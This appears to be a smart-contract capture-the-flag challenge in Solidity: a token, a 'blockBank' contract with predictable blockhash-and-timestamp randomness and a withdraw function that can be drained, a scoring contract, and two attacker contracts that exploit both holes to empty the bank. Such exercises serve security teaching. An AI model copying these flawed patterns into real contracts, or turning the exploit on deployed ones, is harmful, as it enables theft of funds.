//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;
interface IERC20like {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address sender, address spender)
        external
        view
        returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}

contract ERC20 is IERC20 {
    string public constant name = "ERC20";
    string public constant symbol = "ERC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;

    mapping(address => mapping(address => uint256)) allowed;

    uint256 totalSupply_ = 10000 ether;

    constructor() {
        balances[msg.sender] = totalSupply_;
    }

    function totalSupply() public view override returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }

    function transfer(address receiver, uint256 amount)
        public
        override
        returns (bool)
    {
        require(amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender] - amount;
        balances[receiver] = balances[receiver] + amount;
        emit Transfer(msg.sender, receiver, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address sender, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allowed[sender][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        require(amount <= balances[sender]);

        require(amount <= allowed[sender][msg.sender]);

        balances[sender] = balances[sender] - amount;
        allowed[sender][msg.sender] = allowed[sender][msg.sender] - amount;
        balances[recipient] = balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}
contract blockBank{
    ERC20 public token = new ERC20();
    uint256 public totalSupply = token.totalSupply();
    uint256 blockNum;
    bool isFree;
    constructor(){
        blockNum = block.number;
    }

    function deposit(uint256 amount)public{
        require(token.transferFrom(msg.sender,address(this),amount),"transferFrom failed");
        blockNum = block.number;
        totalSupply+=amount;
    }

    function withdraw(uint256 amount)public{
        require(totalSupply>=amount);
        require(block.number<=blockNum);
        totalSupply-=amount;
        token.transfer(msg.sender,amount);
    }

    function getFree(bytes32 guess)public{
        require(!isFree);
        bytes32 num = keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp));
        require(num ==guess);
        isFree=true;
        token.transfer(msg.sender,500);
        totalSupply-=500; 
    }

}
contract attract{
    check che;
    ERC20 erc20;
    constructor(check addr) public {
        che = addr;
        erc20 = che.token();
    }
    function getfree() public {
        bytes32 num = keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp));
        che.getFree(num);
        erc20.approve(address(che),500);
    }
    function att() public {
        che.deposit(500);
        che.withdraw(10000 ether);
        che.isCompleted();
    }
}

contract check is blockBank{
    uint256 public score;
    function isCompleted()public{
        score=0;
        if(isFree){
            score+=25;
        }
        if(token.balanceOf(address(this))==0){
            score+=75;
        }
    }
}
contract att{
    check che;
    ERC20 erc;
    constructor(check addr)public{
        che = addr;
        erc = che.token();
    }
    function getguess() public view returns(bytes32){
        return keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp));
    }
    function getb() public{
        che.getFree(getguess());
    }
    function get1() public{
        erc.approve(address(che),500);
        che.deposit(500);
        che.withdraw(10000 ether);
    }
    function getscore() public{
        che.isCompleted();
    }
}